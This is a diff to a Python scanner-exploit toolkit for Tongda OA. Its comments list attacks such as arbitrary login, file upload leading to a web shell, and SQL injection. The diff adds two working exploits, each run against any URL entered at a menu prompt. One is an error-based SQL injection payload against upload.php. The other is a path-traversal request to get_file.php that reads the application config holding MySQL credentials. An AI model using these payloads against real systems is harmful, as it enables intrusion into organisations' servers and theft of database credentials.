@@ -4,6 +4,7 @@ import time
 import base64
 import datetime
 import uuid
+import os
 
 # 已经完成的功能如下:
 # 1.获取通达版本信息(全版本) -1
@@ -16,7 +17,9 @@ import uuid
 # 8.通达11.7 有效的任意用户登录-管理员在线
 # 9.通达11.8上传ini文件+上传日志文件+getshell
 # 10.通达11.9后台SQL时间盲注
-# 11.批量URL os 待开发
+# 11.老通达upload.php注入
+# 12.老通达get_file.php任意文件读取
+# 13.老通达安装目录泄露 待考虑
 
 RED = '\x1b[1;91m'
 BLUE = '\033[1;94m'
@@ -26,8 +29,8 @@ ENDC = '\033[0m'
 
 def title():
     print(RED + '''
-    Title: 通达oa版本漏洞测试
-    Version: 通达OA 11.3 ~ 11.10
+    Title: tongda-kitev1.0.1
+    Version: 通达OA
     ''' + ENDC)
 
 def Target_version(target_url): # 获取通达版本信息(全版本)
@@ -71,7 +74,7 @@ def weak_login(target_url): # 常规空登录以及获取Cookie(全版本)
             print(BOLD + content + ENDC)
             return content
     except:
-        pass
+        print( BOLD + "目标不存在空口令漏洞或者不能访问" + ENDC)
 
 def file_include(target_url): # 通达11.3任意文件包含漏洞
     content = ''
@@ -351,6 +354,36 @@ def sql_time_injection(target_url,cookie): # 通达11.9后台SQL注入 注意请
     except:
         pass
 
+def old_upload_sqli(target_url):
+    print(BOLD + '测试是否存在老通达upload.php注入' + ENDC)
+    sqli = "/module/AIP/upload.php?T_ID=1&RUN_ID=1%df%27%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e7e7e,md5(123),0x7e7e7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)--%20xxxx&PASSWORD=123456"
+    url = target_url + sqli
+    try:
+        response = requests.get(url=url)
+        # print(response.text)
+        if "202cb962ac59075b964b07152d234b70" in response.text:
+            print(BOLD + '存在老通达upload注入,url地址如下' + ENDC)
+            print(BOLD + url + ENDC)
+        else:
+            print(BOLD + '不存在该漏洞' + ENDC)
+    except:
+        pass
+
+def old_get_file_download(target_url):
+    print(BOLD + '测试是否存在老通达get_file任意文件下载漏洞' + ENDC)
+    download = "/module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php"
+    url = target_url + download
+    try:
+        response = requests.get(url=url)
+        if "$MYSQL_USER" in response.text:
+            print(BOLD + '存在老通达get_file任意文件下载漏洞' + ENDC)
+            print(BOLD + url + ENDC)
+        else:
+            print(BOLD + '不存在该漏洞' + ENDC)
+    except:
+        pass
+
+
 def write_file(content): #随机文件名
     with open('./%s.txt'%(uuid_str),'a+',encoding="utf-8") as f:
         f.write(content)
@@ -362,6 +395,9 @@ def random_name(): #随机字符串
     uuid_str = uuid.uuid4().hex
     return uuid_str
 
+def debug():
+    # read_localfile_url()
+    pass
 
 if __name__ == '__main__':
     title()
@@ -376,7 +412,9 @@ if __name__ == '__main__':
     8 = [测试通达11.7有效的任意用户登录以及监控]
     9 = [测试通达11.8后台文件上传getshell]
     10 = [测试通达11.9后台SQL时间盲注]
-    11 = [单个批量测试1-2-3-4-5]
+    11 = [单个URL批量测试1-2-3-4-5]
+    12 = [old - 通达upload.php注入]
+    13 = [old - 通达get_file.php任意文件读取]
     """) + ENDC)
 
     print( RED + 'URL格式:http:xxx.xxx.xx.xx' + ENDC)
@@ -417,4 +455,7 @@ if __name__ == '__main__':
         content = ispirit_upload(target_url) # 批量5 通达11.3任意文件上传 结合
         write_file(content)
         title_end()
-
+    elif selection == 12:
+        old_upload_sqli((input( GREEN +'请输入目标URL地址：'+ENDC)))
+    elif selection == 13:
+        old_get_file_download((input( GREEN +'请输入目标URL地址：'+ENDC)))
